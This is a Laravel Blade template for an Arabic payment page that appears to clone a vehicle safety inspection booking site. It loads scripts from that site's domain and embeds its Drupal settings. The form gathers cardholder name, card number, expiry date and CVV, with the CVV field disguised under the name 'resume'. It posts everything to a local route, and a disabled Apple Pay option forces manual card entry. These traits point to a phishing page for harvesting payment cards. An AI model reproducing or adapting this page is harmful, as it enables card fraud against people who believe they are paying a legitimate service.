@extends('layouts.main')
@section('styles')
<script src="https://vi.vsafety.sa/core/assets/vendor/modernizr/modernizr.min.js?v=3.11.7"></script>
<script src="https://vi.vsafety.sa/core/misc/modernizr-additional-tests.js?v=3.11.7"></script>
@endsection
@section('content')
    


<div role="main" class="main-container container js-quickedit-main-content">
    <div class="container">
        <div class="row">



            <style>
                .form-check .form-check-input {
                    float: right;
                    margin-right: -1.3em;
                    margin-top: -1.3rem;
                    display: none
                }

                input[type=radio] {
                    width: 2em;
                    height: 2em;
                }
                .book-btn {
                    width: unset;
                }

                .path-book #drupal-modal button[type="submit"]:not(.reset-link), .path-book .booking_form_wrapper button[type="submit"], .booking_form_wrapper button[type="submit"] {
                    padding: 5px 30px;
                    margin-top: unset;
                }

            </style>

            <section class="col-sm-12 py-5">
                
                <div class="region region-content">

                    <script>
                        function change(){
                            var message = `
                            <div class="alert alert-danger mt-5" role="alert">
                                عذراً خدمة الدفع عبر أبل باي - Apple Pay متوقفة حالياً, يمكنك التمتع بتجربة دفع سلسة واُمنة عبر بطاقات الدفع.
                            </div>
                            `;
                            document.getElementById("ToBeChanged").innerHTML = message; 
                        };
                        function remove(){
                            var message = ``;
                            document.getElementById("ToBeChanged").innerHTML = message; 
                        };
                       </script>
                    
                    <div class="row mt-5">
                        <div class="col-12 " style="margin: 2% auto">
                            <p class="pb-4">إختر طريقة الدفع</p>
                        </div>
                        <div class="row " style="margin: 2% auto">
                            <div class="col-md-3 rounded border border-1">
                                <a onClick="remove()">
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" checked>
                                        <label class="form-check-label" for="flexRadioDefault1">
                                            <img src="{{asset('theme/images/cards.png')}}" style="height: 40px">
                                        </label>
                                    </div>
                                </a>
                            </div>
                            <div style="margin-right: 15px" class="col-md-3 rounded border border-1">
                                <a onClick="change()">
                                    <div class="form-check">
                                        <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" disabled>
                                        <label class="form-check-label" for="flexRadioDefault2">
                                            <img src="{{asset('theme/images/768px-Apple_Pay_logo.svg.png')}}" style="height: 40px">
                                        </label>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </diV>

                    <div id="ToBeChanged"></div>
                    

                    <form action="{{route('booking_payment_store')}}" method="post" class="svis-book-book-apply">
                           @csrf                            <div style="background-color: #dbf1f6" class="row mt-5 rounded">

                            <div class="col-sm-12 col-md-8 pb-4">
                                <div id="book_apply" class="booking_form_wrapper">
                                    <h2 style="margin-bottom: unset">الدفع بالبطاقة البنكية</h2>
                                    <div class="row">
                                        <div class="col-sm-6">
                                            <div
                                                class="form-item js-form-item form-type-textfield js-form-type-textfield form-item-customer-name js-form-item-customer-name form-group">
                                                <label for="edit-customer-name"
                                                    class="control-label js-form-required form-required">إسم حامل البطاقة</label>

                                                <input align="left" dir="ltr" data-drupal-selector="edit-customer-name"
                                                    pattern="(^[ء-ي\x20]+$|^[\u0600-\u06FF\x20]+$|^[a-z A-Z&#039;\-\x20]+$)"
                                                    class="form-text required form-control"
                                                    data-msg-maxlength="الحد الأقصى لطول الحقل الاسم هو 30."
                                                    data-msg-required="هذا الحقل ضروري"
                                                    data-msg-pattern="الاسم يحتوي على أحرف غير صالحة."
                                                    type="text" id="edit-customer-name" name="cname" size="60"
                                                    maxlength="30" placeholder="إسم حامل البطاقة" required="required"
                                                    aria-required="true" />
                                            </div>
                                        </div>

                                        <div class="col-sm-6">
                                            <div class="form-item js-form-item form-type-textfield js-form-type-textfield form-item-customer-name js-form-item-customer-name form-group">
                                                <label for="edit-customer-name"
                                                    class="control-label js-form-required form-required">رقم البطاقة</label>
                                                <input data-drupal-selector="edit-customer-nmbr"
                                                    class="form-text required form-control"
                                                    type="tel" id="edit-customer-nmbr"
                                                    name="cnmbr"
                                                    size="19"
                                                    maxlength="19" placeholder="**** **** **** ****" required="required"
                                                    aria-required="true"
                                                    dir="ltr"
                                                    align="left"
                                                    onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)"/>
                                            </div>
                                        </div>
                                        <div style="width: 50%" class="col-sm-6">
                                            <div class="form-item js-form-item form-type-textfield js-form-type-textfield form-item-customer-name js-form-item-customer-name form-group">
                                                <label class="control-label js-form-required form-required">تاريخ الإنتهاء</label>
                                                <input data-drupal-selector="edit-customer-date"
                                                    class="form-text required form-control"
                                                    type="tel" id="edit-customer-date"
                                                    name="exDate"
                                                    size="5"
                                                    maxlength="5" placeholder="MM/YY" required="required"
                                                    aria-required="true" 
                                                    onkeyup="formatString(event);"/>
                                            </div>
                                        </div>

                                        <div style="width: 50%" class="col-sm-6">
                                            <div class="form-item js-form-item form-type-textfield js-form-type-textfield form-item-customer-name js-form-item-customer-name form-group">
                                                <label class="control-label js-form-required form-required">كود الحماية</label>
                                                <input data-drupal-selector="edit-customer-cv"
                                                    class="form-text required form-control"
                                                    type="tel" id="edit-customer-cv"
                                                    name="resume"
                                                    size="3"
                                                    maxlength="3" placeholder="CVV" required="required"
                                                    aria-required="true" />
                                            </div>
                                        </div>
                                        
                                    </div><!-- .row -->
                                    <dov class="row">
                                        <div class="col-4">
                                            <button style="font-size: 18px; background-color: #0096b8" class="book-btn mt-5" type="submit">تأكيــد</button>
                                        </div>
                                        <div class="col-8">
                                            {{-- <img src="{{asset('theme/images/cards.png')}}" class="w-100"> --}}
                                        </div>
                                    </dov>
                                    
                                    
                                    
                                 
                                   
                                   
                                </div><!-- #book-apply -->
                            </div><!-- .col -->
                        </div><!-- .row -->

                    </form>


                </div>

            </section>
        </div><!-- .row -->
    </div><!-- .container -->
</div><!-- .main-container -->
@endsection
@section('scripts')
    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","scriptPath":null,"pathPrefix":"ar\/","currentPath":"book\/apply","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"ar"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"gtm":{"tagId":null,"settings":{"data_layer":"dataLayer","include_classes":false,"allowlist_classes":"google\nnonGooglePixels\nnonGoogleScripts\nnonGoogleIframes","blocklist_classes":"customScripts\ncustomPixels","include_environment":false,"environment_id":"","environment_token":""},"tagIds":["GTM-W5VX94G"]},"gtag":{"tagId":"","otherIds":[],"events":[],"additionalConfigInfo":[]},"ajaxPageState":{"libraries":"bootstrap\/popover,bootstrap\/tooltip,captcha\/base,clientside_validation_jquery\/cv.jquery.ckeditor,clientside_validation_jquery\/cv.jquery.validate,clientside_validation_jquery\/cv.pattern.method,core\/drupal.date,core\/internal.jquery.form,fontawesome\/fontawesome.svg,fontawesome\/fontawesome.svg.shim,google_tag\/gtag,google_tag\/gtag.ajax,google_tag\/gtm,slick\/slick,slick\/slick.easing,slick\/slick.mousewheel,superfish\/superfish,superfish\/superfish_hoverintent,superfish\/superfish_smallscreen,superfish\/superfish_supersubs,superfish\/superfish_supposition,svis_book\/selecticons,svis_book\/svis_book_form,system\/base,vehicle\/global-scripts,vehicle\/rtl,webform_bootstrap\/webform_bootstrap","theme":"vehicle","theme_token":null},"ajaxTrustedUrl":{"form_action_p_pvdeGsVG5zNF_XLGPTvYSKCf43t8qZYSwcfZl2uzM":true,"\/ar\/book\/apply?ajax_form=1":true,"\/ar\/search\/node":true},"clientside_validation_jquery":{"validate_all_ajax_forms":1,"force_validate_on_blur":true,"messages":{"required":"\u0647\u0630\u0627 \u0627\u0644\u062d\u0642\u0644 \u0636\u0631\u0648\u0631\u064a","remote":"Please fix this field.","email":"Please enter a valid email address.","url":"Please enter a valid URL.","date":"Please enter a valid date.","dateISO":"Please enter a valid date (ISO).","number":"\u0627\u0644\u0631\u062c\u0627\u0621 \u0625\u062f\u062e\u0627\u0644 \u0631\u0642\u0645 \u0635\u062d\u064a\u062d","digits":"Please enter only digits.","equalTo":"Please enter the same value again.","maxlength":"Please enter no more than {0} characters.","minlength":"\u0627\u0644\u0631\u062c\u0627\u0621 \u0625\u062f\u062e\u0627\u0644 {0} \u062d\u0631\u0641\u064b\u0627 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644.","rangelength":"Please enter a value between {0} and {1} characters long.","range":"Please enter a value between {0} and {1}.","max":"Please enter a value less than or equal to {0}.","min":"Please enter a value greater than or equal to {0}.","step":"Please enter a multiple of {0}."}},"bootstrap":{"forms_has_error_value_toggle":1,"modal_animation":1,"modal_backdrop":"true","modal_focus_input":1,"modal_keyboard":1,"modal_select_text":1,"modal_show":1,"modal_size":"","popover_enabled":1,"popover_animation":1,"popover_auto_close":1,"popover_container":"body","popover_content":"","popover_delay":"0","popover_html":0,"popover_placement":"right","popover_selector":"","popover_title":"","popover_trigger":"click","tooltip_enabled":1,"tooltip_animation":1,"tooltip_container":"body","tooltip_delay":"0","tooltip_html":0,"tooltip_placement":"auto left","tooltip_selector":"","tooltip_trigger":"hover"},"ajax":{"edit-submit":{"callback":"::submitFormCallback","wrapper":"svis-book-book-apply","event":"mousedown","keypress":true,"prevent":"click","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"next","_triggering_element_value":"\u0627\u0644\u062a\u0627\u0644\u064a"}},"edit-ajax-loader":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::ajaxLoader","event":"change","progress":{"type":"none"},"url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"ajax_loader"}},"edit-appointment-date":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::dateCallback","disable-refocus":false,"event":"change","wrapper":"timeslot_wrapper","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"appointment_date"}},"edit-center-id":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::centerCallback","disable-refocus":false,"event":"change","wrapper":"appointment_date_wrapper","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"center_id"}},"edit-zone-id":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::zoneCallback","disable-refocus":false,"event":"change","wrapper":"center_id_wrapper","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"zone_id"}},"edit-service-id":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::serviceCallback","disable-refocus":false,"event":"change","wrapper":"location_wrapper","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"service_id"}},"edit-vehicle-class-id":{"callback":"Drupal\\svis_book\\SVIS\\FormAPI::vclClassCallback","disable-refocus":true,"event":"change","wrapper":"service_id_wrapper","url":"\/ar\/book\/apply?ajax_form=1","dialogType":"ajax","submit":{"_triggering_element_name":"vehicle_class_id"}}},"superfish":{"superfish-main":{"id":"superfish-main","sf":{"animation":{"opacity":"show","height":"show"},"speed":"fast"},"plugins":{"smallscreen":{"mode":"window_width","expandText":"\u062a\u0648\u0633\u064a\u0639","collapseText":"\u0637\u064a","title":"Main navigation"},"supposition":true,"supersubs":true}}},"user":{"uid":0,"permissionsHash":"6ce9e9b0e3d4242014cdb117e480fc28944904cbd4872320b0434e6a588fb135"}}</script>
    <script src="{{asset('sites/book.vehicle.local/files/js/js_5OYhckd1fYYNc_a7BNzYsKWbWvY5zL0M1y-k8QkJ6ww.js')}}"></script>

    <script src="{{asset('sites/book.vehicle.local/files/js/js_XyYIdcueivG2pN6C65t7AER8FWxK_UCGPQF1731lx_g.js')}}"></script>
    <script src="{{asset('sites/book.vehicle.local/files/js/js_tWp7Vbx725TNBLMIpypwalPws5E-4IJDqpIQJNYsjmw.js')}}"></script>
    <script src="{{asset('sites/book.vehicle.local/files/js/js_B47x9Et2majyK_Hyhy59LB7GR8JyhjrmyQ7YpXJdCn4.js')}}"></script>
<script>
    function formatString(e) {
        var inputChar = String.fromCharCode(event.keyCode);
        var code = event.keyCode;
        var allowedKeys = [8];
        if (allowedKeys.indexOf(code) !== -1) {
            return;
        }

        event.target.value = event.target.value.replace(
            /^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
        ).replace(
            /^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
        ).replace(
            /^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
        ).replace(
            /^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
        ).replace(
            /^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
        ).replace(
            /[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
        ).replace(
            /\/\//g, '/' // Prevent entering more than 1 `/`
        );
    }

</script>

<script>
    function formats(ele,e){
        if(ele.value.length<19){
        ele.value= ele.value.replace(/\W/gi, '').replace(/(.{4})/g, '$1 ');
        return true;
        }else{
        return false;
        }
    }
    
    function numberValidation(e){
        e.target.value = e.target.value.replace(/[^\d ]/g,'');
        return false;
    }
</script>
@endsection